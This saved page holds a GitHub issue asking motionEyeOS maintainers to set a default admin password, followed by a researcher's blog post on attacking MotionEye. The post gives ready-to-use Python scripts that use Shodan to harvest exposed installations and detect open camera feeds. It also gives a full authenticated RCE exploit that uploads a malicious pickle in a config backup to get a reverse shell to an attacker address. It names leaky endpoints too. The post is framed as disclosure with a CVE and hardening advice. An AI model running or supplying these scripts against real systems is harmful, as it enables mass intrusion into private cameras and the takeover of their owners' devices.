=== Content from github.com_13580664_20250114_230121.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmotioneye-project%2Fmotioneyeos%2Fissues%2F2843)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmotioneye-project%2Fmotioneyeos%2Fissues%2F2843)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=motioneye-project%2Fmotioneyeos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[motioneye-project](/motioneye-project)
/
**[motioneyeos](/motioneye-project/motioneyeos)**
Public

* [Notifications](/login?return_to=%2Fmotioneye-project%2Fmotioneyeos) You must be signed in to change notification settings
* [Fork
  913](/login?return_to=%2Fmotioneye-project%2Fmotioneyeos)
* [Star
   7.9k](/login?return_to=%2Fmotioneye-project%2Fmotioneyeos)

* [Code](/motioneye-project/motioneyeos)
* [Issues
  823](/motioneye-project/motioneyeos/issues)
* [Pull requests
  4](/motioneye-project/motioneyeos/pulls)
* [Actions](/motioneye-project/motioneyeos/actions)
* [Wiki](/motioneye-project/motioneyeos/wiki)
* [Security](/motioneye-project/motioneyeos/security)
* [Insights](/motioneye-project/motioneyeos/pulse)

Additional navigation options

* [Code](/motioneye-project/motioneyeos)
* [Issues](/motioneye-project/motioneyeos/issues)
* [Pull requests](/motioneye-project/motioneyeos/pulls)
* [Actions](/motioneye-project/motioneyeos/actions)
* [Wiki](/motioneye-project/motioneyeos/wiki)
* [Security](/motioneye-project/motioneyeos/security)
* [Insights](/motioneye-project/motioneyeos/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmotioneye-project%2Fmotioneyeos%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmotioneye-project%2Fmotioneyeos%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Lack of admin password leaves many publicly available systems vulnerable to RCE #2843

Closed

[pizza-power](/pizza-power) opened this issue
Nov 21, 2021
¬∑ 4 comments

Closed

# [Lack of admin password leaves many publicly available systems vulnerable to RCE](#top) #2843

[pizza-power](/pizza-power) opened this issue
Nov 21, 2021
¬∑ 4 comments

Labels
[invalid](/motioneye-project/motioneyeos/labels/invalid)
[question](/motioneye-project/motioneyeos/labels/question)

## Comments

[![@pizza-power](https://avatars.githubusercontent.com/u/6135659?s=80&u=31a4cd6602d638255831d7212d3d57f45f4e0f4d&v=4)](/pizza-power)

Copy link

### **[pizza-power](/pizza-power)** commented [Nov 21, 2021](#issue-1059410206)

| As with many web-based apps, the admin user can run arbitrary code on the underlying system via the web-gui. While that may or may not be a security issue, and for meye use cases it probably isn‚Äôt, I feel that the lack of password on the admin account has left many publicly available systems open to exploitation.  I‚Äôd suggest a feature to implement a random password on initial installation. Off hand, I don‚Äôt really know how that would look. I may be able to implement something if I find time.  Here is a link to my post about the code execution:  <https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/>  Long story short - an admin can run arbitrary code via the option to run commands when motion is detected (obviously). Additionally, an admin can upload a backup that contains a malicious tasks.pickle file that will execute arbitrary code. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@starbasessd](https://avatars.githubusercontent.com/u/20134429?s=80&v=4)](/starbasessd)

Copy link

### **[starbasessd](/starbasessd)** commented [Nov 21, 2021](#issuecomment-974840077)

| You have the ability to set the admin (root) password and a user password in the WebGUI. You can change their names too (but that may be problematic). They are set blank by default for ease of setup. |
| --- |

All reactions

Sorry, something went wrong.

[![@starbasessd](https://avatars.githubusercontent.com/u/20134429?s=40&v=4)](/starbasessd)
[starbasessd](/starbasessd)
added
[invalid](/motioneye-project/motioneyeos/labels/invalid)
[question](/motioneye-project/motioneyeos/labels/question)
labels
[Nov 21, 2021](#event-5650162862)

[![@pizza-power](https://avatars.githubusercontent.com/u/6135659?s=80&u=31a4cd6602d638255831d7212d3d57f45f4e0f4d&v=4)](/pizza-power)

Copy link

Author

### **[pizza-power](/pizza-power)** commented [Nov 21, 2021](#issuecomment-974850982)

| You have the ability to set the admin (root) password and a user password in the WebGUI. You can change their names too (but that may be problematic). They are set blank by default for ease of setup.  Yeah, I'm familiar with that. I'm just saying that a feature that automatically sets a random password on at least the admin account would be nice. As it stands, there are a lot of unprotected, internet facing installations out there. And they are ripe for becoming unwilling members of a botnet, or worse.  Even a note on the installation page to suggest to users to set a password could be helpful. |
| --- |

All reactions

Sorry, something went wrong.

[![@starbasessd](https://avatars.githubusercontent.com/u/20134429?s=80&v=4)](/starbasessd)

Copy link

### **[starbasessd](/starbasessd)** commented [Nov 21, 2021](#issuecomment-974853688)

| Random passwords are easily forgotten, especially if YOU didn't create it. |
| --- |

All reactions

Sorry, something went wrong.

[![@pizza-power](https://avatars.githubusercontent.com/u/6135659?s=40&u=31a4cd6602d638255831d7212d3d57f45f4e0f4d&v=4)](/pizza-power)
[pizza-power](/pizza-power)
changed the title
~~Lack of admin password leaves many publicly availble system vulnerable to RCE~~
Lack of admin password leaves many publicly available systems vulnerable to RCE
[Nov 22, 2021](#event-5656412814)

[![@bezik46](https://avatars.githubusercontent.com/u/3018438?s=80&v=4)](/bezik46)

Copy link

### **[bezik46](/bezik46)** commented [Dec 19, 2021](#issuecomment-997376154)

| Do not leave empty password & do not make the system open to Internet! Common sense |
| --- |

All reactions

Sorry, something went wrong.

[![@starbasessd](https://avatars.githubusercontent.com/u/20134429?s=40&v=4)](/starbasessd)
[starbasessd](/starbasessd)
closed this as [completed](/motioneye-project/motioneyeos/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Dec 19, 2021](#event-5789133877)

[![@motioneye-project](https://avatars.githubusercontent.com/u/101178162?s=40&v=4)](/motioneye-project)
[motioneye-project](/motioneye-project)
locked and limited conversation to collaborators
[Dec 19, 2021](#event-5789134020)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmotioneye-project%2Fmotioneyeos%2Fissues%2F2843).

Assignees

No one assigned

Labels

[invalid](/motioneye-project/motioneyeos/labels/invalid)
[question](/motioneye-project/motioneyeos/labels/question)

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@bezik46](https://avatars.githubusercontent.com/u/3018438?s=52&v=4)](/bezik46) [![@pizza-power](https://avatars.githubusercontent.com/u/6135659?s=52&v=4)](/pizza-power) [![@starbasessd](https://avatars.githubusercontent.com/u/20134429?s=52&v=4)](/starbasessd)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from www.pizzapower.me_c02433d2_20250114_230122.html ===

# [Pizza-Powered Hacking üçï](https://www.pizzapower.me/)

##

 Menu [Skip to content](#content)

* [Home](https://www.pizzapower.me/)
* [whoami](https://pizzapower.me/whoami)
# Hacking MotionEye/MotionEyeOS

## Getting Started with MotionEye

[MotionEye](https://github.com/ccrisan/motioneye) is an open source, web-based GUI for the popular [Motion](https://motion-project.github.io/) CLI application found on Linux. I‚Äôve known of the Motion command line app for years, but I didn‚Äôt know that MotionEye existed. I ran across it while trying to find a multiple webcam, GUI or web based solution for future projects.

MotionEye comes in a couple forms ‚Äì a standalone app, which I used the [docker container version](https://hub.docker.com/r/ccrisan/motioneye) of, or a ‚Äúwhole‚Äù operating system, [MotionEyeOS](https://github.com/ccrisan/motioneyeos), to install on a Raspberry Pi.

Starting off, I used Shodan search to find internet facing installations. Here is the script I used for that. If you use this script, you‚Äôll need to put in your API key and the limit parameter, which limits the API queries that you use.

```
#!/usr/bin/env python3

import sys
# pip3 install shodan
from shodan import Shodan
import requests

# check for api key
api = Shodan('') # Insert API key here

if api.api_key == '':
    print("No API key found! Exiting")
    sys.exit(1)

limit = 1000 # set this to limit your api query usage
counter = 0

url_file = open("urls.txt", "w")

for response in api.search_cursor('Server: motionEye'):
    ip = response['ip_str']
    port = response['port']
    url = f'http://{ip}:{port}'
    url_file.write(url + '\n')

    # Keep track of how many results have been downloaded so we don't use up all our query credits
    counter += 1
    if counter >= limit:
        break

url_file.close()
```

I ran out of query credits when I ran this script. There are thousands of installations out there. This script will output the IP addresses of those installations.

## Finding Live Feeds

In my review of the application, I found that you can make a query to the */picture/{camera-number}/current/* endpoint, and if it returns a 200 status code, it means that the feed is open to the public. You can also increment the camera-number an enumerate the numbers of cameras a feed will actually have, even if it isn‚Äôt available to view.

I took the output of motioneye-shodan.py script above, and fed it to live-feeds.py script below.

```
#!/usr/bin/env python3

import requests

url_file = open("urls.txt", "r")
urls = url_file.readlines()
url_file.close()

live_urls = open("live-urls.txt", "w")

for url in urls:
    try:
        response = requests.get(url + "/picture/0/current/", verify=False, timeout=3).status_code
        print(response)
        if response == 200:
            live_urls.write(url)
    except:
        pass

live_urls.close()
```

This script outputs the URL of camera feeds that we can view. But the real question here is, what security issues are there with MotionEye?

## Information Leakage

It turns out that if you make a get request to the following endpoint */config/list*, some of the feeds will return their config files. Most of the time these config files are innocuous. I‚Äôm not sure why these are publicly accessible even if the feed is publicly accessible. Maybe it is used as an API endpoint of some sort. I need to dig into the code some more.

However, sometimes these config files contain some very sensitive information. Consider the following config with *email\_notifications\_smtp\_password* and *email\_notifications\_addresses* removed. These passwords are supposed to be for services that the public cannot access, but unfortunately people like to reuse passwords. Again, why is this file even readable?

![](https://www.pizzapower.me/blog/wp-content/uploads/2021/10/Screenshot-from-2021-10-09-07-41-22.png)

Along with the occasional password, email addresses are in here, internal IP addresses and ports, mounting points for local drives, etc.

## Rate-Limiting and Default Credentials

So, the default installation of MotionEye uses the username of admin and a blank password. Additionally, MotionEye does not seem to institute any sort of rate limiting on login attempts. This is a recipe for disaster.

## Authenticated RCE Method #1

Once logged in, I found two simple methods of code execution. The first of which is a classic Python cPickle deserialization exploit.

In the configuration section of the application, there is an option to backup and restore the application configurations. It turns out that if you include a malicious tasks.pickle file in the config you are restoring with, it‚Äôll be written to disk and will be loaded when the application is restarted automatically or manually.

You can simply download the current configuration to use it as a template. After downloading and extracting it, slide your malicious tasks.pickle file and tar.gz everything back up.

The final structure of my motioneye-config.tar.gz for the docker container is as follows:

‚îú‚îÄ‚îÄ camera-1.conf
‚îú‚îÄ‚îÄ motion.conf
‚îú‚îÄ‚îÄ motioneye.conf
‚îî‚îÄ‚îÄ tasks.pickle

Alternatively, the final structure of my motioneye-config.tar.gz lon MotionEyeOS is the following:

‚îú‚îÄ‚îÄ adjtime
‚îú‚îÄ‚îÄ camera-1.conf
‚îú‚îÄ‚îÄ crontabs
‚îú‚îÄ‚îÄ date.conf
‚îú‚îÄ‚îÄ localtime -> /usr/share/zoneinfo/UTC
‚îú‚îÄ‚îÄ motion.conf
‚îú‚îÄ‚îÄ motioneye.conf
‚îú‚îÄ‚îÄ ntp.conf
‚îú‚îÄ‚îÄ os.conf
‚îú‚îÄ‚îÄ proftpd.conf
‚îú‚îÄ‚îÄ shadow
‚îú‚îÄ‚îÄ shadow-
‚îú‚îÄ‚îÄ smb.conf
‚îú‚îÄ‚îÄ ssh
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_dsa\_key
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_dsa\_key.pub
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_ecdsa\_key
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_ecdsa\_key.pub
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_ed25519\_key
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_ed25519\_key.pub
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ssh\_host\_rsa\_key
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ ssh\_host\_rsa\_key.pub
‚îú‚îÄ‚îÄ static\_ip.conf
‚îú‚îÄ‚îÄ tasks.pickle
‚îú‚îÄ‚îÄ version
‚îú‚îÄ‚îÄ watch.conf
‚îî‚îÄ‚îÄ wpa\_supplicant.conf

Pause here: You see, those are ssh keys. So you say why don‚Äôt we just try ssh? Go for it. You also may not even need a password, but some people have either secured ssh or disabled ssh on the actually raspberry pi, so it won‚Äôt work. A lot of these instances will have ssh turned off, and if it is running in docker, you probably won‚Äôt be able to download the ssh keys. Also, it is more fun to write scripts in Python.

Once the configuration is uploaded, wait for the app to reload, or, in unfortunate cases, wait for the app to be reloaded by mother nature or the victim. From what I can see, the docker application will not autoreboot. Here is a Python 3 script that will do all of this. Also, see the [github repo](https://github.com/pizza-power/motioneye-authenticated-RCE), which may be more updated.

```
#!/usr/bin/env python3

import requests
import argparse
import os
import pickle
import hashlib
import tarfile
import time
import string
import random
from requests_toolbelt import MultipartEncoder
import json

# proxies = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}
proxies = {}

def get_cli_args():
    parser = argparse.ArgumentParser(description="MotionEye Authenticated RCE Exploit")
    parser.add_argument(
        "--victim",
        help="Victim url in format ip:port, or just ip if port 80",
        required=True,
    )
    parser.add_argument("--attacker", help="ipaddress:port of attacker", required=True)
    parser.add_argument(
        "--username", help="username of web interface, default=admin", default="admin"
    )
    parser.add_argument(
        "--password", help="password of web interface, default=blank", default=""
    )
    args = parser.parse_args()
    return args

def login(username, password, victim_url):
    session = requests.Session()
    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    headers = {"User-Agent": useragent}
    login_url = f"http://{victim_url}/login/"
    body = f"username={username}&password={password}"
    session.post(login_url, headers=headers, data=body)
    return session

def download_config(username, victim_url, session):
    download_url = f"http://{victim_url}/config/backup/?_username={username}&_signature=5907c8158417212fbef26936d3e5d8a04178b46f"
    backup_file = session.get(download_url)
    open("motioneye-config.tar.gz", "wb").write(backup_file.content)
    return

def create_pickle(ip_address, port):
    shellcode = ""  # put your shellcode here

    class EvilPickle(object):
        def __reduce__(self):
            cmd = shellcode
            return os.system, (cmd,)

    # need protocol=2 and fix_imports=True for python2 compatibility
    pickle_data = pickle.dumps(EvilPickle(), protocol=2, fix_imports=True)
    with open("tasks.pickle", "wb") as file:
        file.write(pickle_data)
        file.close()
    return

def decompress_add_file_recompress():
    with tarfile.open("./motioneye-config.tar.gz") as original_backup:
        original_backup.extractall("./motioneye-config")
        original_backup.close()
    original_backup.close()
    os.remove("./motioneye-config.tar.gz")
    # move malicious tasks.pickle into the extracted directory and then tar and gz it back up
    os.rename("./tasks.pickle", "./motioneye-config/tasks.pickle")
    with tarfile.open("./motioneye-config.tar.gz", "w:gz") as config_tar:
        config_tar.add("./motioneye-config/", arcname=".")
    config_tar.close()
    return

def restore_config(username, password, victim_url, session):
    # a lot of this is not necessary, but makes for good tradecraft
    # recreated 'normal' requests as closely as I could
    t = int(time.time() * 1000)
    path = f"/config/restore/?_={t}&_username={username}"
    # admin_hash is the sha1 hash of the admin's password, which is '' in the default case
    admin_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().lower()
    signature = (
        hashlib.sha1(f"POST:{path}::{admin_hash}".encode("utf-8")).hexdigest().lower()
    )
    restore_url = f"http://{victim_url}/config/restore/?_={t}&_username=admin&_signature={signature}"

    # motioneye checks for "---" as a form boundary. Python Requests only prepends "--"
    # so we have to manually create this
    files = {
        "files": (
            "motioneye-config.tar.gz",
            open("motioneye-config.tar.gz", "rb"),
            "application/gzip",
        )
    }

    useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    boundary = "----WebKitFormBoundary" + "".join(
        random.sample(string.ascii_letters + string.digits, 16)
    )

    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {
        "Content-Type": m.content_type,
        "User-Agent": useragent,
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": "meye_username=_; monitor_info_1=; motion_detected_1=false; capture_fps_1=5.6",
        "Origin": f"http://{victim_url}",
        "Referer": f"http://{victim_url}",
        "Accept-Language": "en-US,en;q=0.9",
    }
    response = session.post(restore_url, data=m, headers=headers, proxies=proxies)
    # if response == reboot false then we need reboot routine
    content = json.loads(response.content.decode("utf-8"))

    if content["reboot"] == True:
        print("Rebooting! Stand by for shell!")
    else:
        print("Manual reboot needed!")
    return

if __name__ == "__main__":
    print("Running exploit!")
    arguments = get_cli_args()
    session = login(arguments.username, arguments.password, arguments.victim)
    download_config(arguments.username, arguments.victim, session)
    # sends attacker ip and port as arguments to create the pickle
    create_pickle(arguments.attacker.split(":")[0], arguments.attacker.split(":")[1])
    decompress_add_file_recompress()
    restore_config(arguments.username, arguments.password, arguments.victim, session)

```
## Authenticated RCE Method #2

Another method of code execution involves motion detection. There is an option to run a system command whenever motion is detected. The security implications of this are obvious.

![](https://www.pizzapower.me/blog/wp-content/uploads/2021/10/rce-motioneye-1024x591.jpg)

python rev shell

## Conclusion

While authentication is needed for RCE, the presence of default credentials and lack of rate limiting make obtaining authentication straightforward. There are a lot of people running this software in a vulnerable manner.

As per my usual advice, don‚Äôt expose MotionEye to the WWW. Like all the self-hosted solutions, I advise you to install this to face your internal network and then connect to your internal network via OpenVPN or Wireguard.

Update: I was give CVE-2021-44255 for the python pickle exploit.

 This entry was posted in [blog](https://www.pizzapower.me/category/blog/), [coding](https://www.pizzapower.me/category/coding/), [cybersecurity](https://www.pizzapower.me/category/cybersecurity/), [security](https://www.pizzapower.me/category/security/), [self hosting](https://www.pizzapower.me/category/self-hosting/) and tagged [cyber](https://www.pizzapower.me/tag/cyber/), [cybersecurity](https://www.pizzapower.me/tag/cybersecurity/), [hacking](https://www.pizzapower.me/tag/hacking/), [infosec](https://www.pizzapower.me/tag/infosec/), [motioneye](https://www.pizzapower.me/tag/motioneye/), [offsec](https://www.pizzapower.me/tag/offsec/), [python](https://www.pizzapower.me/tag/python/), [self hosting](https://www.pizzapower.me/tag/self-hosting/), [shodan](https://www.pizzapower.me/tag/shodan/) on [October 9, 2021](https://www.pizzapower.me/2021/10/09/self-hosted-security-part-1-motioneye/ "12:36 pm") by [pizzapower](https://www.pizzapower.me/author/pizzapower/ "View all posts by pizzapower").
### Post navigation

[‚Üê I‚Äôve Never Heard of Nim](https://www.pizzapower.me/2021/10/06/ive-never-heard-of-nim/) [Tesla Solar, Powerwalls, Docker, Python, and Crypto Mining ‚Üí](https://www.pizzapower.me/2021/11/09/tesla-solar-powerwalls-docker-python-and-crypto-mining/) Search for:
### Recent Posts

* [Mura/Masa CMS ‚Äì SQL Injection CVE-2024-32640](https://www.pizzapower.me/2024/11/13/mura-masa-cms-sql-injection-cve-2024-32640/)
* [iOS 16.7.8 Jailbreak on iPhone X](https://www.pizzapower.me/2024/07/25/ios-16-7-8-jailbreak-on-iphone-x/)
* [Bug Bounty VPS Box Part 2](https://www.pizzapower.me/2023/12/30/bug-bounty-vps-box-part-2/)
* [Hacking RAMADDA, White Box Web Apps, and Bug Bounty Tips](https://www.pizzapower.me/2023/10/20/hacking-ramadda-white-box-web-apps-and-bug-bounty-tips/)
* [Department of Defense Researcher of the Month](https://www.pizzapower.me/2023/08/18/department-of-defense-researcher-of-the-month-and-more/)
### Archives

* [November 2024](https://www.pizzapower.me/2024/11/)
* [July 2024](https://www.pizzapower.me/2024/07/)
* [December 2023](https://www.pizzapower.me/2023/12/)
* [October 2023](https://www.pizzapower.me/2023/10/)
* [August 2023](https://www.pizzapower.me/2023/08/)
* [March 2023](https://www.pizzapower.me/2023/03/)
* [February 2023](https://www.pizzapower.me/2023/02/)
* [January 2023](https://www.pizzapower.me/2023/01/)
* [November 2022](https://www.pizzapower.me/2022/11/)
* [October 2022](https://www.pizzapower.me/2022/10/)
* [September 2022](https://www.pizzapower.me/2022/09/)
* [August 2022](https://www.pizzapower.me/2022/08/)
* [June 2022](https://www.pizzapower.me/2022/06/)
* [April 2022](https://www.pizzapower.me/2022/04/)
* [February 2022](https://www.pizzapower.me/2022/02/)
* [January 2022](https://www.pizzapower.me/2022/01/)
* [December 2021](https://www.pizzapower.me/2021/12/)
* [November 2021](https://www.pizzapower.me/2021/11/)
* [October 2021](https://www.pizzapower.me/2021/10/)
* [September 2021](https://www.pizzapower.me/2021/09/)
* [August 2021](https://www.pizzapower.me/2021/08/)
* [July 2021](https://www.pizzapower.me/2021/07/)
* [June 2021](https://www.pizzapower.me/2021/06/)
* [March 2021](https://www.pizzapower.me/2021/03/)
* [January 2021](https://www.pizzapower.me/2021/01/)
* [December 2020](https://www.pizzapower.me/2020/12/)
* [November 2020](https://www.pizzapower.me/2020/11/)
* [October 2020](https://www.pizzapower.me/2020/10/)
### Categories

* [appsec](https://www.pizzapower.me/category/appsec/)
* [aws](https://www.pizzapower.me/category/aws/)
* [blog](https://www.pizzapower.me/category/blog/)
* [bug bounty](https://www.pizzapower.me/category/bug-bounty/)
* [bugbounty](https://www.pizzapower.me/category/bugbounty/)
* [certifications](https://www.pizzapower.me/category/certifications/)
* [cloud](https://www.pizzapower.me/category/cloud/)
* [coding](https://www.pizzapower.me/category/coding/)
* [coding, webdev](https://www.pizzapower.me/category/coding-webdev/)
* [cryptography](https://www.pizzapower.me/category/cryptography/)
* [CVE](https://www.pizzapower.me/category/cve/)
* [cybersecurity](https://www.pizzapower.me/category/cybersecurity/)
* [devops](https://www.pizzapower.me/category/devops/)
* [docker](https://www.pizzapower.me/category/docker/)
* [golang](https://www.pizzapower.me/category/golang/)
* [hacking](https://www.pizzapower.me/category/hacking/)
* [infosec](https://www.pizzapower.me/category/infosec/)
* [iot](https://www.pizzapower.me/category/iot/)
* [jailbreak](https://www.pizzapower.me/category/jailbreak/)
* [linode](https://www.pizzapower.me/category/linode/)
* [linux](https://www.pizzapower.me/category/linux/)
* [mobile](https://www.pizzapower.me/category/mobile/)
* [offensive security](https://www.pizzapower.me/category/offensive-security/)
* [offsec](https://www.pizzapower.me/category/offsec/)
* [POC](https://www.pizzapower.me/category/poc/)
* [powerwall](https://www.pizzapower.me/category/powerwall/)
* [python](https://www.pizzapower.me/category/python/)
* [security](https://www.pizzapower.me/category/security/)
* [self hosting](https://www.pizzapower.me/category/self-hosting/)
* [site news](https://www.pizzapower.me/category/site-news/)
* [solar](https://www.pizzapower.me/category/solar/)
* [tesla](https://www.pizzapower.me/category/tesla/)
* [torrents](https://www.pizzapower.me/category/torrents/)
* [Uncategorized](https://www.pizzapower.me/category/uncategorized/)
* [vps](https://www.pizzapower.me/category/vps/)
* [webdev](https://www.pizzapower.me/category/webdev/)
* [white box](https://www.pizzapower.me/category/white-box/)
  [Proudly powered by WordPress](https://wordpress.org/ "Semantic Personal Publishing Platform")
